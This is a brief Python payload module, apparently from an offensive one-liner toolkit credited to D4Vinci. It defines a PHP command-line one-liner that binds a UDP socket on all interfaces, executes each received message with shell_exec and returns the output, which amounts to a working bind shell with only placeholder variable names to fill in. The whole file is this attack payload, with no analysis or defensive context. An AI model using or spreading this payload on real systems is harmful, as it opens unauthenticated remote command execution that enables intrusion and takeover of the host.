class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses PHP sockets to establish a bind shell."
    function    = "bind shell"
    liner       = """php -r '$VAR1=socket_create(AF_INET,SOCK_DGRAM, 0);socket_bind($VAR1,"0.0.0.0",PORT);while(NUM1){socket_recvfrom($VAR1,$VAR2,1024,0,$VAR3,$VAR4);$VAR5=shell_exec($VAR2);socket_sendto($VAR1,$VAR5,1024,0,$VAR3,$VAR4);}'"""
